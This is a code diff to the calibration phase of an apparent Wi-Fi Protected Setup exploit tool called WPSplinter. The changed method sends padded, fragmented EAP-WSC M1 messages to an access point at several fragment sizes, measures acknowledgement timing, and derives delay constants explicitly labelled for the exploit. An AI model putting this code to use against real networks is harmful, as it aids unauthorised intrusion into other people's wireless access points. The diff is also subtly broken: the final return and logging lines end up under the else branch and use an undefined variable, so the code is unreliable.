@@ -253,35 +253,58 @@ class WPSplinter:
             return False
     
     def phase_calibrate(self):
-        """Calibrate fragment timing"""
-        self._log("[*] Calibrating fragment timing...")
+        """Calibrate fragment timing and verify offsets"""
+        self._log("[*] Calibrating fragment timing and verifying offsets...")
         
         if not self.associated:
             self.associate()
         
         self.eap_id = 1
-        frag_size = 100
-        num_frags = 10
-        total_size = frag_size * num_frags
         timings = []
+        ack_counts = []
         
-        for i in range(num_frags):
-            flags = 0x01 if i < num_frags - 1 else 0x00
-            frag_data = build_wsc_tlv(WPS_OP_M1) + b'\x41' * (frag_size - 9)
-            
-            start = time.time()
-            self.eap_id += 1
-            self.tx_eapol(eapol_wrap(eap_wsc(EAP_CODE_RESP, self.eap_id, WPS_OP_M1, flags,
-                                            frag_data, lf_total=total_size)))
-            
-            ack = self.wait_frag_ack(timeout=2.0)
-            if not ack:
-                break
-            
-            timings.append(time.time() - start)
+        # Test different fragment sizes to find optimal values
+        test_sizes = [100, 256, 512, 1024, 1500]
         
+        for frag_size in test_sizes:
+            self._log(f"[i] Testing fragment size: {frag_size} bytes")
+            num_frags = min(5, (2048 // frag_size) + 1)
+            total_size = frag_size * num_frags
+            
+            round_timings = []
+            for i in range(num_frags):
+                flags = 0x01 if i < num_frags - 1 else 0x00
+                padding = max(0, frag_size - 9)  # 9 bytes for WSC TLV header
+                frag_data = build_wsc_tlv(WPS_OP_M1) + b'\x41' * padding
+                
+                start = time.time()
+                self.eap_id += 1
+                self.tx_eapol(eapol_wrap(eap_wsc(EAP_CODE_RESP, self.eap_id, WPS_OP_M1, flags,
+                                                frag_data, lf_total=total_size)))
+                
+                ack = self.wait_frag_ack(timeout=2.0)
+                if ack:
+                    round_timings.append(time.time() - start)
+                else:
+                    break
+            
+            if round_timings:
+                avg = sum(round_timings) / len(round_timings)
+                timings.append((frag_size, avg, len(round_timings)))
+                self._log(f"[+] Size {frag_size}: avg={avg:.3f}s, acks={len(round_timings)}/{num_frags}")
+        
+        # Analyze results
         if timings:
-            avg = sum(timings) / len(timings)
+            # Find optimal fragment size (fastest with good ACK rate)
+            optimal = max(timings, key=lambda x: x[2] / (x[1] + 0.001))
+            self._log(f"[+] Optimal fragment size: {optimal[0]} bytes")
+            self._log(f"[+] Average response time: {optimal[1]:.3f}s")
+            
+            # Estimate timing constants for exploit
+            base_delay = optimal[1] * 0.8  # 80% of average as base
+            self._log(f"[i] Recommended calibrate_delay: {base_delay:.3f}s")
+        else:
+            self._log("[-] No successful calibrations")
             self._log(f"[+] Average FRAG-ACK timing: {avg*1000:.1f}ms")
             return avg
         return None
